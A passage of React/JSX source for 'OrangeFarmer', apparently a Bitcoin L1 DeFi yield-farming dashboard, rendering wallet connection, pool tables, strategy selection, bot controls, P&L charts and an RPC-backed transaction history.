                  <div><div style={{ fontSize: 10, color: "#555", textTransform: "uppercase", letterSpacing: "0.08em" }}>TVL</div><div style={{ fontSize: 20, fontWeight: 800, color: "#ccc" }}>{fmtUsd(p.tvl)}</div></div>
                </div>
              </div>
            ))}
          </div>
          <div style={{ textAlign: "center", marginTop: 32 }}>
            <button onClick={() => { setPage("app"); setTab("pools"); }} style={L.heroBtn}>
              View All Pools
              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round"><path d="M5 12h14M12 5l7 7-7 7"/></svg>
            </button>
          </div>
        </div>
      </section>

      {/* CTA */}
      <section style={L.ctaSection}>
        <div style={L.ctaGlow} />
        <TractorLogo size={80} glow />
        <h2 style={{ fontSize: 36, fontWeight: 900, color: "#fff", margin: "20px 0 8px", letterSpacing: "-0.03em", position: "relative", zIndex: 1 }}>Start Farming Today</h2>
        <p style={{ color: "#888", fontSize: 16, marginBottom: 28, position: "relative", zIndex: 1 }}>Connect your wallet and let OrangeFarmer optimize your yields on Bitcoin L1</p>
        <button onClick={() => setPage("app")} style={{ ...L.heroBtn, fontSize: 16, padding: "14px 36px", position: "relative", zIndex: 1 }}>
          Launch App
          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round"><path d="M5 12h14M12 5l7 7-7 7"/></svg>
        </button>
      </section>

      {/* Footer */}
      <footer style={L.footer}>
        <div style={L.footerInner}>
          <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
            <TractorMini size={28} />
            <span style={{ fontWeight: 700, color: "#ff9800" }}>OrangeFarmer</span>
          </div>
          <div style={{ color: "#444", fontSize: 12 }}>Built on OPNet | Bitcoin L1 Smart Contracts</div>
          <div style={{ display: "flex", gap: 16 }}>
            <a href="#" style={{ color: "#555", fontSize: 12 }}>GitHub</a>
            <button onClick={() => setPage("guide")} style={{ color: "#ff9800", fontSize: 12, background: "none", border: "none", cursor: "pointer", fontFamily: "inherit" }}>Guide</button>
            <a href="#" style={{ color: "#555", fontSize: 12 }}>Twitter</a>
          </div>
        </div>
      </footer>
    </div>
  ) : (
    <div style={{ display:"flex", minHeight:"100vh", background: T.bg, color: T.text, fontFamily:"'DM Sans', -apple-system, sans-serif", fontSize:13 }}>
      <style>{cssReset + (theme === "light" ? "body{background:#f0f0f0!important} tr:hover{background:rgba(255,152,0,0.04)!important}" : "")}</style>
      {/* Sidebar */}
      <aside style={{ width:isMobile?250:230, background:T.sidebar, borderRight:`1px solid ${T.border}`, display:"flex", flexDirection:"column", padding:"18px 12px", ...(isMobile ? { position:"fixed",left:mobileMenu?0:-260,top:0,bottom:0,zIndex:200,transition:"left 300ms",boxShadow:mobileMenu?"4px 0 30px rgba(0,0,0,0.5)":"none" } : { position:"sticky",top:0,height:"100vh" }) }}>
        <div style={A.logoArea} onClick={() => setPage("landing")}>
          <TractorMini size={34} />
          <div>
            <div style={A.brand}>OrangeFarmer</div>
            <div style={A.brandSub}>Your Ultimate DeFi Tool</div>
          </div>
        </div>

        <div style={A.navItems}>
          {tabs.map(t => (
            <button key={t.id} onClick={() => setTab(t.id)} style={{ ...A.navBtn, ...(tab === t.id ? A.navActive : {}) }}>
              <div style={{ ...A.navIcon, ...(tab === t.id ? { background: "#ff9800", color: "#000" } : {}) }}>{t.ic}</div>
              <span>{t.label}</span>
              {t.id === "logs" && logs.length > 0 && <span style={A.badge}>{logs.length}</span>}
            </button>
          ))}
        </div>

        <div style={A.sideBottom}>
          {/* Theme toggle */}
          <button onClick={() => setTheme(theme === "dark" ? "light" : "dark")} style={{ display:"flex",alignItems:"center",gap:8,padding:"8px 10px",background:T.input,border:`1px solid ${T.border}`,borderRadius:8,color:T.text,fontSize:12,cursor:"pointer",width:"100%" }}>
            <span style={{ fontSize:16 }}>{theme === "dark" ? "Sun" : "Moon"}</span>
            <span style={{ fontWeight:600 }}>{theme === "dark" ? "Light Mode" : "Dark Mode"}</span>
          </button>
          <div style={{ fontSize: 10, color: T.sub, textTransform: "uppercase", letterSpacing: "0.1em", marginBottom: 6, marginTop: 6 }}>Network</div>
          <select value={network} onChange={e => setNetwork(e.target.value)} style={A.sel}>
            <option value="regtest">Regtest</option>
            <option value="testnet">Testnet</option>
            <option value="mainnet">Mainnet</option>
          </select>
          {!walletConnected ? (
            <div style={{ display:"flex", flexDirection:"column", gap:6 }}>
              <button onClick={connectWallet} disabled={walletLoading} style={{ ...A.connectBtn, opacity: walletLoading ? 0.6 : 1 }}>
                {walletLoading ? "Connecting..." : "Connect OP_WALLET"}
              </button>
              {walletError && (
                <div style={{ fontSize:10, color:"#ff3d00", lineHeight:1.3, padding:"6px 8px", background:"#1a0800", borderRadius:6, border:"1px solid #331000" }}>
                  {walletError}
                  {walletError.includes("not detected") && (
                    <a href="https://chromewebstore.google.com/detail/opwallet/pmbjpcmaaladnfpacpmhmnfmpklgbdjb" target="_blank" rel="noopener noreferrer" style={{ display:"block", marginTop:4, color:"#ff9800", textDecoration:"underline" }}>
                      Install OP_WALLET →
                    </a>
                  )}
                </div>
              )}
            </div>
          ) : (
            <div style={{ display:"flex", flexDirection:"column", gap:4 }}>
              <div style={A.walletBar}>
                <div style={A.walletDot} />
                <span style={{ fontSize:11, color:"#999", flex:1 }}>{shortenAddr(walletAddr)}</span>
                <button onClick={disconnectWallet} style={{ background:"none", border:"none", color:"#555", fontSize:10, cursor:"pointer", padding:"2px 4px" }} title="Disconnect">✕</button>
              </div>
              {walletBalance > 0 && (
                <div style={{ fontSize:10, color:"#ff9800", paddingLeft:16 }}>
                  {(walletBalance / 100000000).toFixed(8)} BTC
                </div>
              )}
              {onChainBalances.MOTO !== undefined && onChainBalances.MOTO > 0n && (
                <div style={{ fontSize:10, color:"#ccc", paddingLeft:16 }}>
                  {SDK.fromBigInt(onChainBalances.MOTO, 8).toFixed(4)} MOTO
                  {onChainBalances.stakedMOTO !== undefined && onChainBalances.stakedMOTO > 0n && <span style={{ color:"#00e676" }}> ({SDK.fromBigInt(onChainBalances.stakedMOTO, 8).toFixed(4)} staked)</span>}
                </div>
              )}
            </div>
          )}
        </div>
      </aside>
      {/* Mobile overlay */}
      {isMobile && mobileMenu && <div onClick={() => setMobileMenu(false)} style={{ position:"fixed",inset:0,background:"rgba(0,0,0,0.5)",zIndex:199 }} />}

      {/* Main */}
      <main style={{ ...A.main, marginLeft: isMobile ? 0 : undefined }}>
        {/* Header */}
        <header style={{ ...A.header, background: T.headerBg, borderBottom: `1px solid ${T.border}` }}>
          <div style={{ display:"flex",alignItems:"center",gap:12 }}>
            {isMobile && <button onClick={() => setMobileMenu(!mobileMenu)} style={{ background:"none",border:"none",color:T.text,fontSize:22,cursor:"pointer",padding:"4px" }}>☰</button>}
            <div>
            <h1 style={A.pageTitle}>{tabs.find(t => t.id === tab)?.label}</h1>
            <p style={A.pageSub}>
              {tab === "dashboard" ? "Farming performance overview" : tab === "pools" ? "Liquidity pools on OPNet" : tab === "bot" ? "Automated yield engine" : tab === "logs" ? "Real-time activity" : tab === "portfolio" ? "P&L analytics & allocation" : tab === "history" ? "On-chain transaction log" : tab === "notify" ? "Telegram & Discord alerts" : "Bot configuration"}
            </p>
          </div>
          {walletConnected && (
            <button onClick={() => { setBotRunning(!botRunning); addLog(botRunning ? "Bot paused" : "Bot started", botRunning ? "warning" : "success"); }}
              style={{ ...A.botBtn, background: botRunning ? "#ff9800" : "transparent", color: botRunning ? "#000" : "#ff9800", border: botRunning ? "none" : "1px solid #ff980044" }}>
              {botRunning ? "\u23F8 Running" : "\u25B6 Start Bot"}
              {botRunning && <span style={A.pulse} />}
            </button>
          )}
        </header>

        <div style={A.content}>
          {/* ── DASHBOARD ── */}
          {tab === "dashboard" && <>
            {/* Transaction Status Banner */}
            {txPending && (
              <div style={{ padding:"12px 18px", background:"linear-gradient(135deg, #ff980020, #e6510020)", border:"1px solid #ff980040", borderRadius:10, display:"flex", alignItems:"center", gap:12, animation:"pulse 1.5s infinite" }}>
                <div style={{ width:10, height:10, borderRadius:"50%", background:"#ff9800", animation:"pulse 1.5s infinite" }} />
                <div>
                  <div style={{ fontWeight:700, color:"#ff9800", fontSize:13 }}>{txTarget || "Transaction"}</div>
                  <div style={{ fontSize:11, color:"#999" }}>
                    {txStatus === "approving" ? "Approving token spending..." :
                     txStatus === "approving-tokenA" ? "Approving Token A..." :
                     txStatus === "approving-tokenB" ? "Approving Token B..." :
                     txStatus === "simulating" ? "Simulating transaction..." :
                     txStatus === "waiting-wallet" ? "Confirm in OP_WALLET..." :
                     txStatus === "error" ? "Transaction failed" :
                     "Processing..."}
                  </div>
                </div>
              </div>
            )}

            {/* Quick Actions Bar */}
            {walletConnected && sdkAvailable && (
              <div style={{ display:"flex", gap:8, flexWrap:"wrap" }}>
                <button onClick={realClaimRewards} disabled={txPending} style={{ padding:"8px 18px", background:"linear-gradient(135deg, #00e676, #00c853)", border:"none", borderRadius:8, color:"#000", fontWeight:700, fontSize:12, cursor:"pointer", opacity:txPending?0.5:1 }}>
                  Claim Rewards
                </button>
                <button onClick={() => realUnstake(posSize)} disabled={txPending} style={{ padding:"8px 18px", background:"none", border:"1px solid #ff9800", borderRadius:8, color:"#ff9800", fontWeight:600, fontSize:12, cursor:"pointer", opacity:txPending?0.5:1 }}>
                  Unstake {fmtBtc(posSize)}
                </button>
                <button onClick={refreshOnChainBalances} style={{ padding:"8px 18px", background:"none", border:"1px solid #333", borderRadius:8, color:"#888", fontWeight:600, fontSize:12, cursor:"pointer" }}>
                  Refresh Balances
                </button>
                {!sdkAvailable && <span style={{ fontSize:11, color:"#ff3d00", alignSelf:"center" }}>SDK not loaded — simulation mode</span>}
              </div>
            )}
            <div style={{ ...A.statsRow, gridTemplateColumns: isMobile ? "1fr 1fr" : "repeat(4, 1fr)" }}>
              {[
                { l: "Total Staked", v: totalStaked, s: " BTC", c: "#ff9800", d: 6 },
                { l: "Total Earned", v: totalEarned, s: " MOTO", c: "#00e676" },
                { l: "Position Size", v: posSize, s: " BTC", c: "#42a5f5", d: 6 },
                { l: "Block", v: blockHeight || "—", d: 0, c: "#ab47bc" },
              ].map((s,i) => (
                <div key={i} style={A.statCard}>
                  <div style={{ width: 6, height: 6, borderRadius: "50%", background: s.c, marginBottom: 10 }} />
                  <div style={A.statLabel}>{s.l}</div>
                  <div style={A.statVal}><AnimCounter value={s.v} prefix={s.p||""} suffix={s.s||""} dec={s.d??2} /></div>
                </div>
              ))}
            </div>

            <div style={A.card}>
              <div style={A.cardHead}><h2 style={A.cardTitle}>Active Positions</h2><span style={A.cardBadge}>{pools.filter(x=>x.stake>0).length} pools</span></div>
              <div style={{ overflowX: "auto" }}>
                <div style={{ overflowX: "auto" }}><table style={A.table}><thead><tr>
                  {["Pool","Protocol","APR","Trend","Staked","Rewards","Risk"].map(h => <th key={h} style={A.th}>{h}</th>)}
                </tr></thead><tbody>
                  {pools.filter(p=>p.stake>0).map(p => (
                    <tr key={p.id} style={A.tr}>
                      <td style={A.td}><div style={{ display:"flex",alignItems:"center",gap:8 }}><div style={{ ...A.tIcon, background: `hsl(${p.id*47},65%,40%)` }}>{p.t0[0]}</div><span style={{ fontWeight:600 }}>{p.name}</span></div></td>
                      <td style={A.td}><span style={A.proto}>{p.proto}</span></td>
                      <td style={{ ...A.td, color:"#00e676", fontWeight:700 }}>{p.apr.toFixed(1)}%</td>
                      <td style={A.td}><Spark data={sparkData[p.id]||[p.apr]} color={p.apr>100?"#00e676":"#ff9800"} /></td>
                      <td style={A.td}>{p.stake > 0 ? fmtBtc(p.stake) : "—"}</td>
                      <td style={{ ...A.td, color:"#ff9800", fontWeight:600 }}>{p.rew.toFixed(2)} MOTO</td>
                      <td style={A.td}><Risk level={p.risk} /></td>
                    </tr>
                  ))}
                  {pools.filter(p=>p.stake>0).length === 0 && <tr><td colSpan={7} style={{ ...A.td, textAlign:"center", color:"#444", padding:40 }}>{walletConnected ? "No positions yet. Deposit into pools or start the bot." : "Connect wallet to view positions."}</td></tr>}
                </tbody></table></div>
              </div>
            </div>

            <div style={A.card}>
              <div style={A.cardHead}>
                <h2 style={A.cardTitle}>Strategy</h2>
                <span style={A.cardBadge}>{pools.filter(p => poolAvailable(p, network) && riskAllowed(p.risk, STRATEGIES.find(s=>s.id===strategy)?.maxRisk)).length} eligible pools</span>
              </div>
              <div style={{ ...A.stratGrid, gridTemplateColumns: isMobile ? "1fr 1fr" : "repeat(4, 1fr)" }}>
                {STRATEGIES.map(s => {
                  const eligible = pools.filter(p => poolAvailable(p, network) && riskAllowed(p.risk, s.maxRisk));
                  const active = strategy === s.id;
                  return (
                    <button key={s.id} onClick={() => changeStrategy(s.id)} style={{
                      ...A.stratCard,
                      ...(active ? A.stratActive : {}),
                      opacity: active ? 1 : 0.75,
                    }}>
                      <div style={{ fontSize: 24, marginBottom: 6 }}>{s.icon}</div>
                      <div style={{ fontWeight: 700, fontSize: 14, marginBottom: 3, color: active ? "#ff9800" : "#ccc" }}>{s.name}</div>
                      <div style={{ fontSize: 11, color: "#666", marginBottom: 6 }}>{s.desc}</div>
                      <div style={{ fontSize: 11, color: "#ff9800", fontWeight: 600, marginBottom: 4 }}>{s.target}</div>
                      <div style={{ fontSize: 10, color: active ? "#00e676" : "#555", marginTop: 2 }}>
                        {eligible.length} pools | {s.maxRisk} risk cap
                      </div>
                      {active && (
                        <div style={{ position:"absolute",top:8,right:8,width:8,height:8,borderRadius:"50%",background:"#00e676",boxShadow:"0 0 8px #00e67666" }} />
                      )}
                      {active && botRunning && (
                        <div style={{ marginTop:8,fontSize:10,color:"#00e676",fontWeight:600,letterSpacing:"0.05em" }}>
                          ACTIVE — monitoring
                        </div>
                      )}
                    </button>
                  );
                })}
              </div>
            </div>
          </>}

          {/* ── POOLS ── */}
          {tab === "portfolio" && <>
            {/* PnL Chart */}
            <div style={{ ...A.card, background: T.card, borderColor: T.border }}>
              <div style={A.cardHead}><h2 style={{ ...A.cardTitle, color: T.text }}>P&L Over Time</h2><span style={A.cardBadge}>{pnlHistory.length} points</span></div>
              <div style={{ height: 200, position: "relative", marginTop: 10 }}>
                {pnlHistory.length > 2 ? (() => {
                  const w = 700, h = 180, data = pnlHistory;
                  const earnedVals = data.map(d => d.earned);
                  const stakeVals = data.map(d => d.staked);
                  const mn = Math.min(...earnedVals, ...stakeVals), mx = Math.max(...earnedVals, ...stakeVals);
                  const rng = mx - mn || 1;
                  const toY = v => h - ((v - mn) / rng) * (h - 20) - 10;
                  const toX = i => (i / (data.length - 1)) * w;
                  const earnedPts = data.map((d, i) => `${toX(i)},${toY(d.earned)}`).join(" ");
                  const stakedPts = data.map((d, i) => `${toX(i)},${toY(d.staked)}`).join(" ");
                  return (
                    <svg width="100%" height={h} viewBox={`0 0 ${w} ${h}`} preserveAspectRatio="none" style={{ display: "block" }}>
                      <defs>
                        <linearGradient id="earnGrad" x1="0" y1="0" x2="0" y2="1"><stop offset="0%" stopColor="#00e676" stopOpacity="0.3"/><stop offset="100%" stopColor="#00e676" stopOpacity="0"/></linearGradient>
                      </defs>
                      <polygon fill="url(#earnGrad)" points={`0,${h} ${earnedPts} ${w},${h}`} />
                      <polyline fill="none" stroke="#00e676" strokeWidth="2" points={earnedPts} />
                      <polyline fill="none" stroke="#ff9800" strokeWidth="2" strokeDasharray="4,4" points={stakedPts} />
                    </svg>
                  );
                })() : <div style={{ textAlign: "center", color: T.sub, paddingTop: 60 }}>Start the bot to generate P&L data</div>}
              </div>
              <div style={{ display: "flex", gap: 20, justifyContent: "center", marginTop: 8 }}>
                <span style={{ fontSize: 11, display: "flex", alignItems: "center", gap: 6 }}><span style={{ width: 12, height: 3, background: "#00e676", borderRadius: 2 }} /> Earned (MOTO)</span>
                <span style={{ fontSize: 11, display: "flex", alignItems: "center", gap: 6 }}><span style={{ width: 12, height: 3, background: "#ff9800", borderRadius: 2, borderStyle: "dashed" }} /> Staked (BTC)</span>
              </div>
            </div>

            {/* Stats Row */}
            <div style={{ display: "grid", gridTemplateColumns: isMobile ? "1fr 1fr" : "repeat(4, 1fr)", gap: 10 }}>
              {[
                { l: "Total P&L", v: `${totalEarned.toFixed(2)} MOTO`, c: totalEarned > 0 ? "#00e676" : "#ff3d00" },
                { l: "ROI", v: totalStaked > 0 ? `${((totalEarned * 0.01) / totalStaked * 100).toFixed(1)}%` : "—", c: "#ff9800" },
                { l: "Active Pools", v: pools.filter(p => p.stake > 0).length, c: "#42a5f5" },
                { l: "Dev Fees Paid", v: `${devFeesTotal.toFixed(4)} MOTO`, c: "#ab47bc" },
              ].map((s, i) => (
                <div key={i} style={{ ...A.statCard, background: T.card, borderColor: T.border }}>
                  <div style={{ fontSize: 10, color: T.sub, textTransform: "uppercase", letterSpacing: "0.07em", marginBottom: 6 }}>{s.l}</div>
                  <div style={{ fontSize: 18, fontWeight: 800, color: s.c }}>{s.v}</div>
                </div>
              ))}
            </div>

            {/* Pool Allocation */}
            <div style={{ ...A.card, background: T.card, borderColor: T.border }}>
              <div style={A.cardHead}><h2 style={{ ...A.cardTitle, color: T.text }}>Pool Allocation</h2></div>
              {(() => {
                const active = pools.filter(p => p.stake > 0);
                const total = active.reduce((s, p) => s + p.stake, 0) || 1;
                const colors = ["#ff9800", "#00e676", "#42a5f5", "#ab47bc", "#ff3d00", "#ffeb3b", "#e040fb", "#00bcd4"];
                return active.length > 0 ? (
                  <div>
                    {/* Bar */}
                    <div style={{ display: "flex", height: 28, borderRadius: 8, overflow: "hidden", marginBottom: 12 }}>
                      {active.map((p, i) => (
                        <div key={p.id} style={{ width: `${(p.stake / total * 100)}%`, background: colors[i % colors.length], minWidth: 4, transition: "width 300ms" }} title={`${p.name}: ${(p.stake/total*100).toFixed(1)}%`} />
                      ))}
                    </div>
                    {/* Legend */}
                    <div style={{ display: "grid", gridTemplateColumns: isMobile ? "1fr" : "1fr 1fr", gap: 8 }}>
                      {active.map((p, i) => (
                        <div key={p.id} style={{ display: "flex", alignItems: "center", gap: 8, padding: "6px 10px", background: T.input, borderRadius: 6 }}>
                          <div style={{ width: 10, height: 10, borderRadius: 3, background: colors[i % colors.length], flexShrink: 0 }} />
                          <span style={{ fontSize: 12, flex: 1, color: T.text }}>{p.name}</span>
                          <span style={{ fontSize: 12, fontWeight: 700, color: colors[i % colors.length] }}>{(p.stake/total*100).toFixed(1)}%</span>
                          <span style={{ fontSize: 10, color: T.sub }}>{fmtBtc(p.stake)}</span>
                        </div>
                      ))}
                    </div>
                  </div>
                ) : <div style={{ textAlign: "center", color: T.sub, padding: 30 }}>No active positions</div>;
              })()}
            </div>
          </>}

          {tab === "pools" && <>
            <div style={A.card}>
              <div style={A.cardHead}>
                <h2 style={A.cardTitle}>All Pools</h2>
                <div style={{ display:"flex", gap:8, alignItems:"center" }}>
                  <span style={{ fontSize:10, color:"#555" }}>Strategy: {STRATEGIES.find(s=>s.id===strategy)?.name}</span>
                  <span style={A.cardBadge}>{pools.filter(p => poolAvailable(p, network) && riskAllowed(p.risk, STRATEGIES.find(s=>s.id===strategy)?.maxRisk)).length} eligible</span>
                </div>
              </div>
              <div style={{ overflowX: "auto" }}><table style={A.table}><thead><tr>
                {["","Pool","Protocol","APR","TVL","Volume 24h","Risk",""].map(h => <th key={h} style={A.th}>{h}</th>)}
              </tr></thead><tbody>
                {[...pools].sort((a,b)=>b.apr-a.apr).map(p => {
                  const onNetwork = poolAvailable(p, network);
                  const eligible = onNetwork && riskAllowed(p.risk, STRATEGIES.find(s=>s.id===strategy)?.maxRisk);
                  return (
                    <tr key={p.id} style={{ ...A.tr, opacity: eligible ? 1 : onNetwork ? 0.35 : 0.15 }}>
                      <td style={{ ...A.td, width: 24 }}>
                        <div style={{ width:8, height:8, borderRadius:"50%", background: eligible ? "#00e676" : "#333", boxShadow: eligible ? "0 0 6px #00e67644" : "none" }} />
                      </td>
                      <td style={A.td}><div style={{ display:"flex",alignItems:"center",gap:8 }}><div style={{ ...A.tIcon, background: `hsl(${p.id*47},65%,40%)` }}>{p.t0[0]}</div><div><div style={{ fontWeight:600 }}>{p.name}</div><div style={{ fontSize:10,color:"#555" }}>{p.t0}{p.t1?`/${p.t1}`:""}</div></div></div></td>
                      <td style={A.td}><span style={A.proto}>{p.proto}</span></td>
                      <td style={{ ...A.td, color: p.apr>200?"#ff3d00":p.apr>100?"#00e676":"#ff9800", fontWeight:700 }}>{p.apr.toFixed(1)}%</td>
                      <td style={A.td}>{fmtUsd(p.tvl)}</td>
                      <td style={A.td}>{fmtUsd(p.vol)}</td>
                      <td style={A.td}><Risk level={p.risk} /></td>
                      <td style={A.td}>
                        {eligible ? (
                          <div style={{ display:"flex", gap:4, alignItems:"center" }}>
                            <button onClick={() => { if(!walletConnected) return; if(sdkAvailable) { realDeposit(p); } else { setPools(prev => prev.map(pp => pp.id===p.id ? { ...pp, stake: pp.stake+posSize } : pp)); addLog(`[Sim] Deposited ${fmtBtc(posSize)} into ${p.name}`, "success"); } }} disabled={txPending && txTarget===p.name} style={{ ...A.actBtn, opacity: txPending && txTarget===p.name ? 0.5 : 1 }}>{txPending && txTarget===p.name ? txStatus || "..." : p.stake>0?"Add More":"Deposit"}</button>
                            {p.stake > 0 && sdkAvailable && p.proto === "Staking" && (
                              <button onClick={() => realUnstake(p.stake)} disabled={txPending} style={{ padding:"4px 10px", background:"none", border:"1px solid #ff980060", borderRadius:6, color:"#ff9800", fontSize:10, cursor:"pointer", opacity:txPending?0.5:1 }}>Withdraw</button>
                            )}
                            <span style={{ fontSize:8, color:"#555", textTransform:"uppercase" }}>{SDK.getPoolDepositType(p)}</span>
                          </div>
                        ) : !onNetwork ? (
                          <span style={{ fontSize:10, color:"#333" }}>Not on {network}</span>
                        ) : (
                          <span style={{ fontSize:10, color:"#444" }}>Blocked by strategy</span>
                        )}
                      </td>
                    </tr>
                  );
                })}
              </tbody></table></div>
            </div>
          </>}

          {/* ── BOT ── */}
          {tab === "bot" && <>
            <div style={{ display:"grid", gridTemplateColumns: isMobile ? "1fr" : "1fr 1fr", gap:16 }}>
              <div style={A.card}>
                <div style={A.cardHead}><h2 style={A.cardTitle}>Status</h2><div style={{ width:10,height:10,borderRadius:"50%",background:botRunning?"#00e676":"#444" }} /></div>
                {[
                  ["Status", botRunning ? `Active (${nextScan}s)` : "Paused", botRunning?"#00e676":"#ff9800"],
                  ["Strategy", STRATEGIES.find(s=>s.id===strategy)?.name, "#ff9800"],
                  ["Block Height", blockHeight ? `#${blockHeight}` : "—", "#42a5f5"],
                  ["Fee Rate", feeRate ? `${feeRate} sat/vB (${feeLevel})` : "—", feeLevel==="low"?"#00e676":feeLevel==="high"?"#ff9800":feeLevel==="extreme"?"#ff3d00":"#ccc"],
                  ["Eligible Pools", `${pools.filter(p => poolAvailable(p, network) && riskAllowed(p.risk, STRATEGIES.find(s=>s.id===strategy)?.maxRisk)).length} / ${pools.length}`, "#ccc"],
                  ["Scan Interval", "30s", "#ccc"],
                  ["Cycles", botCycles, "#ccc"],
                  ["Network", network, "#ccc"],
                ].map(([l,v,c],i)=>(
                  <div key={i} style={{ display:"flex",justifyContent:"space-between",padding:"8px 0",borderBottom:"1px solid #111" }}><span style={{ color:"#666",fontSize:12 }}>{l}</span><span style={{ fontWeight:600,color:c,fontSize:12 }}>{v}</span></div>
                ))}
                {botRunning && <div style={{ marginTop:8, padding:"6px 10px", background:"#0a0a0e", borderRadius:6, display:"flex", justifyContent:"space-between", alignItems:"center" }}>
                  <span style={{ fontSize:10, color:"#666" }}>Next scan</span>
                  <div style={{ display:"flex", alignItems:"center", gap:6 }}>
                    <div style={{ width:80, height:4, background:"#111", borderRadius:2, overflow:"hidden" }}>
                      <div style={{ width:`${((30 - nextScan) / 30) * 100}%`, height:"100%", background:"#ff9800", borderRadius:2, transition:"width 1s linear" }} />
                    </div>
                    <span style={{ fontSize:11, fontWeight:700, color:"#ff9800", fontVariantNumeric:"tabular-nums", minWidth:22 }}>{nextScan}s</span>
                  </div>
                </div>}
                <button onClick={() => { setBotRunning(!botRunning); addLog(botRunning?"Bot paused":"Bot started — monitoring every 30s",botRunning?"warning":"success"); }} style={{ ...A.bigBtn, background:botRunning?"#1a0e00":"#ff9800", color:botRunning?"#ff9800":"#000", border:botRunning?"1px solid #ff980033":"none" }}>{botRunning?"\u23F8 Pause":"\u25B6 Start"}</button>
              </div>
              <div style={A.card}>
                <div style={A.cardHead}><h2 style={A.cardTitle}>Action Weights ({STRATEGIES.find(s=>s.id===strategy)?.name})</h2></div>
                {BOT_ACTIONS.map((a,i) => {
                  const w = STRATEGY_WEIGHTS[strategy]?.[a] || 0;
                  const maxW = Math.max(...Object.values(STRATEGY_WEIGHTS[strategy] || {}));
                  const pct = maxW > 0 ? (w / maxW) * 100 : 0;
                  return (
                    <div key={a} style={{ display:"flex",alignItems:"center",gap:10,padding:"6px 0",borderBottom:"1px solid #0a0a0a" }}>
                      <div style={{ width:7,height:7,borderRadius:"50%",background: w===0 ? "#333" : botRunning?`hsl(${i*45},70%,55%)`:"#555",flexShrink:0 }} />
                      <span style={{ flex:1,fontSize:12,color: w===0 ? "#333" : "#ccc" }}>{a}</span>
                      <div style={{ width:60,height:4,background:"#111",borderRadius:2,overflow:"hidden" }}>
                        <div style={{ width:`${pct}%`,height:"100%",background: w===0?"transparent":"#ff9800",borderRadius:2,transition:"width 400ms" }} />
                      </div>
                      <span style={{ fontSize:10,color: w===0?"#333":botRunning?"#00e676":"#555",width:32,textAlign:"right" }}>{w===0?"OFF":botRunning?"LIVE":"x"+w}</span>
                    </div>
                  );
                })}
              </div>
            </div>

            {/* Strategy selector in bot tab */}
            <div style={A.card}>
              <div style={A.cardHead}><h2 style={A.cardTitle}>Switch Strategy</h2></div>
              <div style={{ ...A.stratGrid, gridTemplateColumns: isMobile ? "1fr 1fr" : "repeat(4, 1fr)" }}>
                {STRATEGIES.map(s => {
                  const eligible = pools.filter(p => poolAvailable(p, network) && riskAllowed(p.risk, s.maxRisk));
                  const active = strategy === s.id;
                  return (
                    <button key={s.id} onClick={() => changeStrategy(s.id)} style={{
                      ...A.stratCard, ...(active ? A.stratActive : {}), opacity: active ? 1 : 0.7,
                    }}>
                      <div style={{ fontSize: 24, marginBottom: 6 }}>{s.icon}</div>
                      <div style={{ fontWeight: 700, fontSize: 14, marginBottom: 3, color: active ? "#ff9800" : "#ccc" }}>{s.name}</div>
                      <div style={{ fontSize: 11, color: "#666", marginBottom: 4 }}>{s.desc}</div>
                      <div style={{ fontSize: 11, color: "#ff9800", fontWeight: 600 }}>{s.target}</div>
                      <div style={{ fontSize: 10, color: "#555", marginTop: 4 }}>{eligible.length} pools | 30s scan</div>
                      {active && <div style={{ position:"absolute",top:8,right:8,width:8,height:8,borderRadius:"50%",background:"#00e676",boxShadow:"0 0 8px #00e67666" }} />}
                    </button>
                  );
                })}
              </div>
            </div>
          </>}

          {/* ── LOGS ── */}
          {/* ── HISTORY (Transaction History) ── */}
          {tab === "history" && (
            <div style={{ ...A.card, background: T.card, borderColor: T.border }}>
              <div style={A.cardHead}>
                <h2 style={{ ...A.cardTitle, color: T.text }}>Transaction History</h2>
                <div style={{ display: "flex", gap: 6 }}>
                  <span style={A.cardBadge}>{txHistory.length} txns</span>
                  <button onClick={async () => {
                    setTxLoading(true);
                    try {
                      const rpcUrl = CONTRACTS[network]?.RPC || CONTRACTS.regtest.RPC;
                      const res = await fetch(rpcUrl, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ jsonrpc: "2.0", id: 1, method: "btc_getLatestPendingTransactions", params: [] }) });
                      const data = await res.json();
                      if (data?.result && Array.isArray(data.result)) {
                        const rpcTxs = data.result.slice(0, 10).map((tx, i) => ({
                          id: Date.now() + i,
                          type: "on-chain",
                          pool: tx.to ? `${tx.to.slice(0, 10)}...` : "Pending",
                          amount: 0,
                          block: tx.blockNumber || "pending",
                          fee: tx.gasUsed || 0,
                          ts: new Date().toISOString(),
                          hash: tx.hash || "",
                        }));
                        setTxHistory(prev => [...rpcTxs, ...prev].slice(0, 50));
                        addLog(`Fetched ${rpcTxs.length} pending txns from ${network} RPC`, "success");
                      }
                    } catch (e) { addLog(`RPC tx fetch failed: ${e.message}`, "warning"); }
                    setTxLoading(false);
                  }} style={{ padding: "4px 12px", background: "none", border: `1px solid ${T.border}`, borderRadius: 6, color: T.sub, fontSize: 11, cursor: "pointer" }}>
                    {txLoading ? "Loading..." : "Fetch from RPC"}
                  </button>
                </div>
              </div>
              <div style={{ maxHeight: 500, overflowY: "auto" }}>
                {txHistory.length === 0 ? (
                  <div style={{ textAlign: "center", color: T.sub, padding: 40 }}>No transactions yet. Start the bot or fetch from RPC.</div>
                ) : (
                  <table style={{ ...A.table, borderColor: T.border }}>
                    <thead><tr>
                      {["Type", "Pool", "Amount", "Block", "Fee (sats)", "Time"].map(h => <th key={h} style={{ ...A.th, color: T.sub, borderColor: T.border }}>{h}</th>)}
                    </tr></thead>
                    <tbody>
                      {[...txHistory].reverse().map(tx => (
                        <tr key={tx.id} style={{ ...A.tr, borderColor: T.border }}>
                          <td style={A.td}><span style={{ padding: "2px 8px", borderRadius: 4, fontSize: 10, fontWeight: 700, background: tx.type === "harvest" ? "#00e67615" : tx.type === "rotation" ? "#ff980015" : tx.type === "on-chain" ? "#42a5f515" : "#ab47bc15", color: tx.type === "harvest" ? "#00e676" : tx.type === "rotation" ? "#ff9800" : tx.type === "on-chain" ? "#42a5f5" : "#ab47bc" }}>{tx.type}</span></td>
                          <td style={{ ...A.td, color: T.text }}>{tx.pool}</td>
                          <td style={{ ...A.td, fontWeight: 600, color: "#ff9800" }}>{tx.amount > 0 ? fmtBtc(tx.amount) : "—"}</td>
